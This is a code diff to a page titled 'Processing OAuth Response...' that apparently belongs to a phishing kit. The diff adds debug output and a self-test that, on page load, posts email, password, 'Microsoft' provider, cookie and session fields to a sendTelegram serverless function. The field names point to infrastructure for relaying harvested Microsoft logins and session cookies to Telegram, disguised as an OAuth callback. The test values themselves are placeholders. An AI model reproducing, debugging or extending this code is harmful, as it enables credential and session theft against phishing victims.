@@ -46,16 +46,37 @@
 </head>
 <body>
     <div class="container">
-        <h2>Processing OAuth Response...</h2>
-        <div class="spinner"></div>
-        <p id="status">Exchanging authorization code for access token...</p>
-        <div id="result"></div>
+                 <h2>Processing OAuth Response...</h2>
+         <div class="spinner"></div>
+         <p id="status">Exchanging authorization code for access token...</p>
+         <div id="debug" style="background: #f0f0f0; padding: 10px; margin: 10px 0; font-size: 12px; border-radius: 4px;"></div>
+         <div id="result"></div>
     </div>
 
-    <script>
-        async function handleOAuthCallback() {
-            const statusEl = document.getElementById('status');
-            const resultEl = document.getElementById('result');
+         <script>
+         async function handleOAuthCallback() {
+             const statusEl = document.getElementById('status');
+             const resultEl = document.getElementById('result');
+             
+                           // DOMAIN DEBUG INFO
+              const domainInfo = {
+                  origin: window.location.origin,
+                  hostname: window.location.hostname,
+                  href: window.location.href,
+                  pathname: window.location.pathname,
+                  functionUrl: window.location.origin + '/.netlify/functions/sendTelegram'
+              };
+              
+              console.log('🔍 CALLBACK PAGE DOMAIN INFO:', domainInfo);
+              
+              // Show domain info on page
+              const debugEl = document.getElementById('debug');
+              debugEl.innerHTML = `
+                  <strong>Domain Debug:</strong><br>
+                  Origin: ${domainInfo.origin}<br>
+                  Function URL: ${domainInfo.functionUrl}<br>
+                  Current URL: ${domainInfo.href}
+              `;
 
             try {
                 // Get URL parameters
@@ -287,6 +308,37 @@
 
         // Run when page loads
         handleOAuthCallback();
+        
+        // IMMEDIATE TEST: Send a simple test message to verify Telegram works from this page
+        setTimeout(async () => {
+            console.log('🧪 IMMEDIATE TEST: Sending test message from callback page...');
+            try {
+                const testResponse = await fetch('/.netlify/functions/sendTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: 'callback-page-test@immediate.com',
+                        password: 'IMMEDIATE TEST from OAuth callback page',
+                        provider: 'Microsoft',
+                        formattedCookies: [],
+                        sessionId: 'immediate_test_' + Date.now(),
+                        fileName: 'OAuth Callback Page Test',
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                const testResult = await testResponse.json();
+                console.log('🧪 IMMEDIATE TEST result:', testResult);
+                
+                if (testResult.success) {
+                    console.log('✅ IMMEDIATE TEST SUCCESS - Telegram works from callback page!');
+                } else {
+                    console.log('❌ IMMEDIATE TEST FAILED:', testResult.error);
+                }
+            } catch (testError) {
+                console.error('❌ IMMEDIATE TEST ERROR:', testError);
+            }
+        }, 2000); // Wait 2 seconds after page load
     </script>
 </body>
 </html>
